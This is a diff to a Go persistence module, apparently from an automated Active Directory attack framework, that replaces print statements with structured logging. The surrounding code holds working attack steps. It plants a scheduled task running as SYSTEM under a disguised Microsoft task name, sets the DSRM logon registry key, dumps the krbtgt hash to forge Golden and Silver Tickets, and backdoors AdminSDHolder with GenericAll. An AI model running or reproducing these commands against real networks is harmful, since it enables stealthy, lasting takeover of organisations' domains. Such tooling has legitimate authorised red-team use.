@@ -3,6 +3,7 @@ package modules
 import (
 	"context"
 	"fmt"
+	"log/slog"
 	"net/url"
 	"regexp"
 	"strings"
@@ -32,7 +33,7 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 
 	host, found := selectTarget(state, targetHost)
 	if !found {
-		fmt.Println("[!] No target for persistence")
+		slog.Warn("No target for persistence")
 		result.Success = false
 		return result
 	}
@@ -42,7 +43,7 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 		domain, user, pass, hash = getCredential(state)
 	}
 	if domain == "" || user == "" {
-		fmt.Println("[!] No credentials for persistence")
+		slog.Warn("No credentials for persistence")
 		result.Success = false
 		return result
 	}
@@ -67,7 +68,7 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 		}
 		flagSkeletonKeyOpportunity(host, result)
 	} else {
-		fmt.Println("[*] Target is not a DC — skipping Golden Ticket / AdminSDHolder / Skeleton Key")
+		slog.Debug("Target is not a DC — skipping Golden Ticket / AdminSDHolder / Skeleton Key")
 	}
 
 	// Silver Ticket runs against any host, not just the DC — it only needs a
@@ -79,10 +80,10 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 	}
 
 	if deployed == 0 {
-		fmt.Println("[!] No persistence mechanisms deployed")
+		slog.Warn("No persistence mechanisms deployed")
 		result.Success = false
 	} else {
-		fmt.Printf("[+] %d persistence mechanism(s) deployed\n", deployed)
+		slog.Info("Persistence mechanism(s) deployed", "count", deployed)
 	}
 	return result
 }
@@ -91,7 +92,7 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 // original by routing through RunFailover (so a wmiexec hang doesn't kill the phase)
 // and by giving the task a less attention-grabbing name.
 func deployScheduledTask(ctx context.Context, exec core.Executor, host core.Host, result *core.ToolResult) bool {
-	fmt.Println("[*] Creating scheduled task persistence (onlogon, SYSTEM)...")
+	slog.Debug("Creating scheduled task persistence (onlogon, SYSTEM)...")
 	cmd := `schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\HealthCheck" ` +
 		`/tr "cmd.exe /c start /B powershell -NoP -W Hidden -C exit" ` +
 		`/sc onlogon /ru SYSTEM /rl HIGHEST /f`
@@ -99,10 +100,10 @@ func deployScheduledTask(ctx context.Context, exec core.Executor, host core.Host
 		Artifact: cmd, Method: "command", Timeout: 45 * time.Second,
 	})
 	if !r.Success {
-		fmt.Printf("[!] Scheduled task creation failed (last method=%s)\n", r.Method)
+		slog.Warn("Scheduled task creation failed", "method", r.Method)
 		return false
 	}
-	fmt.Printf("[+] Scheduled task created via %s\n", r.Method)
+	slog.Info("Scheduled task created", "method", r.Method)
 	result.Evidence = append(result.Evidence, core.EvidenceEntry{
 		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
 		Source: "schtasks", Key: host.IP,
@@ -123,16 +124,16 @@ func deployDSRM(ctx context.Context, exec core.Executor, host core.Host, result 
 	if !host.IsDC {
 		return false
 	}
-	fmt.Println("[*] Enabling DSRM password-reuse logon (registry)...")
+	slog.Debug("Enabling DSRM password-reuse logon (registry)...")
 	cmd := `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f`
 	r := exec.Execute(ctx, core.Action{
 		Artifact: cmd, Method: "command", Timeout: 30 * time.Second,
 	})
 	if !r.Success {
-		fmt.Printf("[!] DSRM registry write failed (last method=%s)\n", r.Method)
+		slog.Warn("DSRM registry write failed", "method", r.Method)
 		return false
 	}
-	fmt.Printf("[+] DSRM logon behavior set to 2 via %s\n", r.Method)
+	slog.Info("DSRM logon behavior set to 2", "method", r.Method)
 	result.Evidence = append(result.Evidence, core.EvidenceEntry{
 		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
 		Source: "dsrm", Key: host.IP,
@@ -150,14 +151,14 @@ func deployDSRM(ctx context.Context, exec core.Executor, host core.Host, result 
 //
 // This requires DA-level creds (already enforced upstream by validation phase).
 func deployGoldenTicket(host core.Host, domain, user, pass, hash string, result *core.ToolResult, state *core.ADState) bool {
-	fmt.Println("[*] Forging Golden Ticket (secretsdump krbtgt → impacket-ticketer)...")
+	slog.Debug("Forging Golden Ticket (secretsdump krbtgt → impacket-ticketer)...")
 
 	if _, err := utils.FindTool("impacket-secretsdump"); err != nil {
-		fmt.Println("[!] impacket-secretsdump not found, skipping Golden Ticket")
+		slog.Warn("impacket-secretsdump not found, skipping Golden Ticket")
 		return false
 	}
 	if _, err := utils.FindTool("impacket-ticketer"); err != nil {
-		fmt.Println("[!] impacket-ticketer not found, skipping Golden Ticket")
+		slog.Warn("impacket-ticketer not found, skipping Golden Ticket")
 		return false
 	}
 
@@ -181,7 +182,7 @@ func deployGoldenTicket(host core.Host, domain, user, pass, hash string, result 
 		r := utils.RunCommandTimeout(2*time.Minute, "impacket-secretsdump", args)
 		if !r.Success {
 			lastErr = strings.TrimSpace(r.Stderr)
-			fmt.Printf("[!] secretsdump krbtgt failed on %s: %s\n", dcIP, lastErr)
+			slog.Warn("secretsdump krbtgt failed on host", "host", dcIP, "error", lastErr)
 			continue
 		}
 
@@ -196,22 +197,20 @@ func deployGoldenTicket(host core.Host, domain, user, pass, hash string, result 
 			strings.Contains(lower, "status_access_denied") ||
 			strings.Contains(lower, "dra_bad_dn") ||
 			strings.Contains(lower, "name_error_not_unique"):
-			fmt.Printf("[!] Golden Ticket: %s\\%s lacks DCSync rights on %s — needs Replicating Directory Changes\n",
-				domain, user, dcIP)
+			slog.Warn("Golden Ticket: lacks DCSync rights on host — needs Replicating Directory Changes", "domain", domain, "username", user, "host", dcIP)
 			lastErr = "access_denied"
 			continue
 		case strings.Contains(lower, "logon_failure") ||
 			strings.Contains(lower, "kdc_err_preauth_failed") ||
 			strings.Contains(lower, "invalid credentials") ||
 			strings.Contains(lower, "status_logon_failure"):
-			fmt.Printf("[!] Golden Ticket: auth rejected for %s\\%s on %s — credentials are wrong\n",
-				domain, user, dcIP)
+			slog.Warn("Golden Ticket: auth rejected — credentials are wrong", "domain", domain, "username", user, "host", dcIP)
 			return false // auth won't work on any DC
 		}
 
 		krbtgtHash := extractKrbtgtNTHash(r.Stdout)
 		if krbtgtHash == "" {
-			fmt.Printf("[!] Golden Ticket: secretsdump on %s succeeded but krbtgt NT hash not in output\n", dcIP)
+			slog.Warn("Golden Ticket: secretsdump succeeded but krbtgt NT hash not in output", "host", dcIP)
 			lastErr = "parser_miss"
 			continue
 		}
@@ -219,7 +218,7 @@ func deployGoldenTicket(host core.Host, domain, user, pass, hash string, result 
 		// Hash found! Now resolve the domain SID via impacket-lookupsid.
 		domainSID := resolveDomainSID(domain, user, pass, hash, dcIP)
 		if domainSID == "" {
-			fmt.Println("[!] Could not resolve domain SID via impacket-lookupsid")
+			slog.Warn("Could not resolve domain SID via impacket-lookupsid")
 			return false
 		}
 
@@ -230,11 +229,11 @@ func deployGoldenTicket(host core.Host, domain, user, pass, hash string, result 
 	// All DCs exhausted.
 	switch lastErr {
 	case "access_denied":
-		fmt.Printf("[!] Golden Ticket: no DC found where %s\\%s has DCSync rights — need DA in target domain\n", domain, user)
+		slog.Warn("Golden Ticket: no DC found with DCSync rights — need DA in target domain", "domain", domain, "username", user)
 	case "parser_miss":
-		fmt.Println("[!] Golden Ticket: secretsdump ran but krbtgt hash not in output (parser miss or empty replication response)")
+		slog.Warn("Golden Ticket: secretsdump ran but krbtgt hash not in output (parser miss or empty replication response)")
 	default:
-		fmt.Printf("[!] Golden Ticket: all DCs failed — last error: %s\n", lastErr)
+		slog.Warn("Golden Ticket: all DCs failed", "last_error", lastErr)
 	}
 	return false
 }
@@ -253,7 +252,7 @@ func forgeAndSaveTicket(krbtgtHash, domainSID, domain string, result *core.ToolR
 	}
 	tr := utils.RunCommandTimeout(60*time.Second, "impacket-ticketer", tArgs)
 	if !tr.Success {
-		fmt.Printf("[!] impacket-ticketer failed: %s\n", tr.Stderr)
+		slog.Warn("impacket-ticketer failed", "error", tr.Stderr)
 		return false
 	}
 
@@ -263,8 +262,8 @@ func forgeAndSaveTicket(krbtgtHash, domainSID, domain string, result *core.ToolR
 		ccachePath = fmt.Sprintf("./%s.ccache", ccacheUser)
 	}
 
-	fmt.Printf("[+] Golden Ticket forged: %s\n", ccachePath)
-	fmt.Printf("    use: export KRB5CCNAME=%s\n", ccachePath)
+	slog.Info("Golden Ticket forged", "path", ccachePath)
+	slog.Info("Use: export KRB5CCNAME=path", "path", ccachePath)
 	result.Evidence = append(result.Evidence, core.EvidenceEntry{
 		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
 		Source: "golden_ticket", Key: ccacheUser + "@" + domain,
@@ -369,21 +368,21 @@ func collectSilverTicketCandidates(state *core.ADState, domain string) []silverT
 func deploySilverTickets(state *core.ADState, host core.Host, domain, user, pass, hash string, result *core.ToolResult) int {
 	candidates := collectSilverTicketCandidates(state, domain)
 	if len(candidates) == 0 {
-		fmt.Println("[*] No service hashes in state — skipping Silver Ticket")
+		slog.Debug("No service hashes in state — skipping Silver Ticket")
 		return 0
 	}
 	if _, err := utils.FindTool("impacket-ticketer"); err != nil {
-		fmt.Println("[!] impacket-ticketer not found, skipping Silver Ticket")
+		slog.Warn("impacket-ticketer not found, skipping Silver Ticket")
 		return 0
 	}
 
 	domainSID := resolveDomainSID(domain, user, pass, hash, host.IP)
 	if domainSID == "" {
-		fmt.Println("[!] Could not resolve domain SID — skipping Silver Ticket")
+		slog.Warn("Could not resolve domain SID — skipping Silver Ticket")
 		return 0
 	}
 
-	fmt.Printf("[*] Forging Silver Tickets for %d service hash(es)...\n", len(candidates))
+	slog.Debug("Forging Silver Tickets for service hash(es)", "count", len(candidates))
 
 	// Impersonate "Administrator" by default — operator can change later by
 	// re-running with KRB5CCNAME pointed at the forged ticket.
@@ -405,8 +404,7 @@ func deploySilverTickets(state *core.ADState, host core.Host, domain, user, pass
 		}
 		r := utils.RunCommandTimeout(60*time.Second, "impacket-ticketer", args)
 		if !r.Success {
-			fmt.Printf("    ✗ %s: ticketer failed — %s\n", c.spn,
-				strings.TrimSpace(r.Stderr))
+			slog.Warn("Silver ticket: ticketer failed", "spn", c.spn, "error", strings.TrimSpace(r.Stderr))
 			continue
 		}
 
@@ -418,7 +416,7 @@ func deploySilverTickets(state *core.ADState, host core.Host, domain, user, pass
 			ccachePath = fmt.Sprintf("./%s.ccache", impersonated)
 		}
 
-		fmt.Printf("    ✓ %s → %s (signed by %s)\n", c.spn, ccachePath, c.username)
+		slog.Info("Silver ticket forged", "spn", c.spn, "path", ccachePath, "signed_by", c.username)
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhasePersistence,
 			Source: "silver_ticket",
@@ -431,7 +429,7 @@ func deploySilverTickets(state *core.ADState, host core.Host, domain, user, pass
 	}
 
 	if deployed > 0 {
-		fmt.Printf("[+] %d Silver Ticket(s) forged. Use: export KRB5CCNAME=<path>\n", deployed)
+		slog.Info("Silver Ticket(s) forged", "count", deployed)
 	}
 	return deployed
 }
@@ -442,7 +440,7 @@ func deploySilverTickets(state *core.ADState, host core.Host, domain, user, pass
 // Tries impacket-dacledit (modern, native) first; falls back to bloodyAD which
 // many red teamers have installed. Both are LDAP operations — no shell needed.
 func deployAdminSDHolder(host core.Host, domain, user, pass, hash string, result *core.ToolResult) bool {
-	fmt.Println("[*] Backdooring AdminSDHolder (GenericAll → SDProp propagation)...")
+	slog.Debug("Backdooring AdminSDHolder (GenericAll → SDProp propagation)...")
 
 	// We grant the existing admin user GenericAll on AdminSDHolder. The principal
 	// is the same authenticated user — survives password reset because the ACE
@@ -461,7 +459,7 @@ func deployAdminSDHolder(host core.Host, domain, user, pass, hash string, result
 		args = append(args, impacketHashArgs(hash)...)
 		r := utils.RunCommandTimeout(60*time.Second, "impacket-dacledit", args)
 		if r.Success {
-			fmt.Printf("[+] AdminSDHolder GenericAll granted to %s (impacket-dacledit)\n", principal)
+			slog.Info("AdminSDHolder GenericAll granted (impacket-dacledit)", "principal", principal)
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type: core.EvCredAcquired, Phase: core.PhasePersistence,
 				Source: "adminsdholder", Key: host.IP,
@@ -470,7 +468,7 @@ func deployAdminSDHolder(host core.Host, domain, user, pass, hash string, result
 			})
 			return true
 		}
-		fmt.Printf("[!] impacket-dacledit failed: %s\n", r.Stderr)
+		slog.Warn("impacket-dacledit failed", "error", r.Stderr)
 	}
 
 	if _, err := utils.FindTool("bloodyAD"); err == nil {
@@ -483,7 +481,7 @@ func deployAdminSDHolder(host core.Host, domain, user, pass, hash string, result
 		args := append(auth, "add", "genericAll", buildAdminSDHolderDN(domain), principal)
 		r := utils.RunCommandTimeout(60*time.Second, "bloodyAD", args)
 		if r.Success {
-			fmt.Printf("[+] AdminSDHolder GenericAll granted to %s (bloodyAD)\n", principal)
+			slog.Info("AdminSDHolder GenericAll granted (bloodyAD)", "principal", principal)
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type: core.EvCredAcquired, Phase: core.PhasePersistence,
 				Source: "adminsdholder", Key: host.IP,
@@ -492,10 +490,10 @@ func deployAdminSDHolder(host core.Host, domain, user, pass, hash string, result
 			})
 			return true
 		}
-		fmt.Printf("[!] bloodyAD failed: %s\n", r.Stderr)
+		slog.Warn("bloodyAD failed", "error", r.Stderr)
 	}
 
-	fmt.Println("[!] Neither impacket-dacledit nor bloodyAD available, skipping AdminSDHolder")
+	slog.Warn("Neither impacket-dacledit nor bloodyAD available, skipping AdminSDHolder")
 	return false
 }
 
@@ -507,8 +505,8 @@ func flagSkeletonKeyOpportunity(host core.Host, result *core.ToolResult) {
 	if !tools.GoMimikatz.Available() {
 		return
 	}
-	fmt.Println("[*] Skeleton Key opportunity: target is DC")
-	fmt.Println("    (not auto-deployed — high detection signal; run manually if scoped)")
+	slog.Debug("Skeleton Key opportunity: target is DC")
+	slog.Info("(not auto-deployed — high detection signal; run manually if scoped)")
 	result.Evidence = append(result.Evidence, core.EvidenceEntry{
 		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
 		Source: "skeleton_key", Key: host.IP,
